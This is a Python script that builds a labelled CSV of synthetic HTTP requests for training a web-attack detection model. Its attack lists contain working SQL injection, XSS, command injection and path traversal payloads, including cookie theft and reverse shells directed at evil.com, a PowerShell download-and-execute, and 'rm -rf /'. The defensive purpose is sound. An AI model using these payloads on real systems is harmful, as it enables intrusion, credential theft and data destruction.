"""
Generate Realistic HTTP Training Data for ML Model
===================================================
Creates training data that mimics real HTTP requests with:
- Realistic URLs, parameters, headers
- Real-world attack patterns from CVE database
- Proper HTTP request structure
"""
import csv
import random
import urllib.parse

def generate_realistic_normal_requests():
    """Generate realistic normal HTTP requests"""
    
    # Real URL patterns
    paths = [
        "/api/users", "/api/products", "/api/orders", "/api/search",
        "/login", "/register", "/profile", "/dashboard", "/settings",
        "/products/123", "/users/456", "/posts/789",
        "/api/v1/data", "/api/v2/analytics", "/api/reports",
        "/images/logo.png", "/css/style.css", "/js/app.js",
        "/docs/api", "/help/faq", "/about", "/contact",
    ]
    
    # Real query parameters
    normal_queries = [
        "?page=1&limit=10",
        "?search=laptop&category=electronics",
        "?sort=price&order=asc",
        "?user_id=12345&action=view",
        "?q=python+tutorial&lang=en",
        "?filter=active&status=published",
        "?date=2024-01-15&format=json",
        "?id=abc123&type=product",
        "?name=John+Doe&email=john@example.com",
        "?start=0&count=20&sort=date",
        "?category=books&price_min=10&price_max=50",
        "?tag=technology&author=admin",
        "?session=xyz789&token=valid",
        "?lang=ar&region=eg",
        "?view=grid&columns=3",
    ]
    
    # Real POST data
    post_bodies = [
        "username=john&password=SecurePass123",
        "email=user@example.com&subscribe=true",
        "title=My+Post&content=Hello+World&tags=tech",
        "product_id=123&quantity=2&color=blue",
        "name=Ahmed&phone=01234567890&city=Cairo",
        "comment=Great+article&rating=5",
        "search_term=machine+learning&filters=recent",
        "old_password=pass123&new_password=NewPass456",
        "first_name=Sara&last_name=Ali&age=25",
        "order_id=ORD123&status=shipped&tracking=TRK456",
    ]
    
    # Real headers
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)",
    ]
    
    requests = []
    
    # GET requests
    for _ in range(200):
        path = random.choice(paths)
        query = random.choice(normal_queries)
        ua = random.choice(user_agents)
        requests.append(f"GET {path}{query} User-Agent: {ua}")
    
    # POST requests
    for _ in range(150):
        path = random.choice(paths)
        body = random.choice(post_bodies)
        ua = random.choice(user_agents)
        requests.append(f"POST {path} {body} User-Agent: {ua}")
    
    return requests


def generate_realistic_sql_injection():
    """Generate realistic SQL injection attacks"""
    
    # Real SQL injection patterns from CVE database
    sql_patterns = [
        # UNION-based
        "' UNION SELECT NULL,NULL,NULL--",
        "1' UNION ALL SELECT username,password,email FROM users--",
        "' UNION SELECT @@version,NULL,NULL--",
        "1' UNION SELECT table_name FROM information_schema.tables--",
        
        # Boolean-based blind
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'x'='x",
        "' AND 'x'='y",
        "1' AND SUBSTRING(@@version,1,1)='5'--",
        
        # Time-based blind
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND SLEEP(5)--",
        "1' AND IF(1=1,SLEEP(5),0)--",
        "'; SELECT pg_sleep(5)--",
        
        # Error-based
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,database()),1)--",
        
        # Stacked queries
        "'; DROP TABLE users--",
        "'; DELETE FROM products WHERE 1=1--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; INSERT INTO admins VALUES('hacker','pass')--",
        
        # Command execution
        "'; EXEC xp_cmdshell('whoami')--",
        "'; EXEC master..xp_cmdshell 'dir'--",
        "' OR 1=1; EXEC sp_executesql N'SELECT * FROM users'--",
        
        # Authentication bypass
        "admin'--",
        "admin'#",
        "admin'/*",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "admin' OR '1'='1",
        "' OR 'a'='a",
        
        # Advanced techniques
        "1' ORDER BY 10--",
        "1' GROUP BY 1,2,3--",
        "' HAVING 1=1--",
        "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
    ]
    
    # Inject into realistic contexts
    contexts = [
        "?id={}",
        "?search={}",
        "?username={}",
        "?product_id={}",
        "?order={}",
        "username={}&password=test",
        "email={}&action=reset",
        "filter={}&sort=date",
    ]
    
    attacks = []
    for _ in range(250):
        pattern = random.choice(sql_patterns)
        context = random.choice(contexts)
        full_attack = context.format(urllib.parse.quote(pattern))
        attacks.append(f"GET /api/data{full_attack}")
    
    return attacks


def generate_realistic_xss():
    """Generate realistic XSS attacks"""
    
    xss_patterns = [
        # Script tags
        "<script>alert(document.cookie)</script>",
        "<script>window.location='http://evil.com?c='+document.cookie</script>",
        "<script src='http://evil.com/xss.js'></script>",
        "<script>fetch('http://evil.com',{method:'POST',body:document.cookie})</script>",
        
        # Event handlers
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(document.domain)>",
        "<input onfocus=alert(1) autofocus>",
        "<iframe onload=alert(1)>",
        "<video onerror=alert(1) src=x>",
        "<audio onerror=alert(1) src=x>",
        
        # JavaScript protocol
        "<a href='javascript:alert(1)'>click</a>",
        "<iframe src='javascript:alert(1)'>",
        "<form action='javascript:alert(1)'>",
        
        # Data URI
        "<iframe src='data:text/html,<script>alert(1)</script>'>",
        "<object data='data:text/html,<script>alert(1)</script>'>",
        
        # DOM-based
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script></svg>",
        
        # Filter bypass
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "<svg/onload=alert(1)>",
        "<img src=x:alert(1) onerror=eval(src)>",
        
        # Stored XSS contexts
        "<div onmouseover=alert(1)>hover me</div>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]
    
    contexts = [
        "?comment={}",
        "?name={}",
        "?message={}",
        "?description={}",
        "?title={}",
        "?content={}",
        "?bio={}",
        "?search={}",
    ]
    
    attacks = []
    for _ in range(200):
        pattern = random.choice(xss_patterns)
        context = random.choice(contexts)
        full_attack = context.format(urllib.parse.quote(pattern))
        attacks.append(f"POST /api/comment{full_attack}")
    
    return attacks


def generate_realistic_command_injection():
    """Generate realistic command injection attacks"""
    
    cmd_patterns = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(cat /etc/shadow)",
        "; wget http://evil.com/shell.sh",
        "| curl http://evil.com/backdoor",
        "; rm -rf /",
        "& nc -e /bin/bash evil.com 4444",
        "`python -c 'import socket...'`",
        "$(bash -i >& /dev/tcp/evil.com/4444 0>&1)",
        "; ping -c 10 evil.com",
        "| nslookup evil.com",
        "& powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com')",
    ]
    
    contexts = [
        "?file={}",
        "?path={}",
        "?cmd={}",
        "?exec={}",
        "?url={}",
    ]
    
    attacks = []
    for _ in range(100):
        pattern = random.choice(cmd_patterns)
        context = random.choice(contexts)
        full_attack = context.format(urllib.parse.quote(pattern))
        attacks.append(f"GET /api/execute{full_attack}")
    
    return attacks


def generate_realistic_path_traversal():
    """Generate realistic path traversal attacks"""
    
    path_patterns = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\\\\....\\\\....\\\\windows\\\\system32",
        "/var/www/../../etc/passwd",
        "file:///etc/passwd",
    ]
    
    contexts = [
        "?file={}",
        "?path={}",
        "?download={}",
        "?include={}",
        "?page={}",
    ]
    
    attacks = []
    for _ in range(100):
        pattern = random.choice(path_patterns)
        context = random.choice(contexts)
        full_attack = context.format(urllib.parse.quote(pattern))
        attacks.append(f"GET /api/file{full_attack}")
    
    return attacks


def save_to_csv(filename="data/ml_training_data.csv"):
    """Save realistic training data to CSV"""
    
    print("Generating realistic training data...")
    
    normal_data = generate_realistic_normal_requests()
    sql_data = generate_realistic_sql_injection()
    xss_data = generate_realistic_xss()
    cmd_data = generate_realistic_command_injection()
    path_data = generate_realistic_path_traversal()
    
    all_data = []
    
    # Label: 0 = Normal, 1 = Attack
    for text in normal_data:
        all_data.append({"text": text, "label": 0})
    
    for text in sql_data:
        all_data.append({"text": text, "label": 1})
    
    for text in xss_data:
        all_data.append({"text": text, "label": 1})
    
    for text in cmd_data:
        all_data.append({"text": text, "label": 1})
    
    for text in path_data:
        all_data.append({"text": text, "label": 1})
    
    # Shuffle to avoid ordering bias
    random.shuffle(all_data)
    
    # Save to CSV
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['text', 'label'])
        writer.writeheader()
        writer.writerows(all_data)
    
    print(f"\n✅ Generated {len(all_data)} samples")
    print(f"   Normal requests: {len(normal_data)}")
    print(f"   SQL Injection: {len(sql_data)}")
    print(f"   XSS: {len(xss_data)}")
    print(f"   Command Injection: {len(cmd_data)}")
    print(f"   Path Traversal: {len(path_data)}")
    print(f"\n📁 Saved to: {filename}")
    print(f"\n🔄 Next step: python train_model.py")


if __name__ == "__main__":
    save_to_csv()
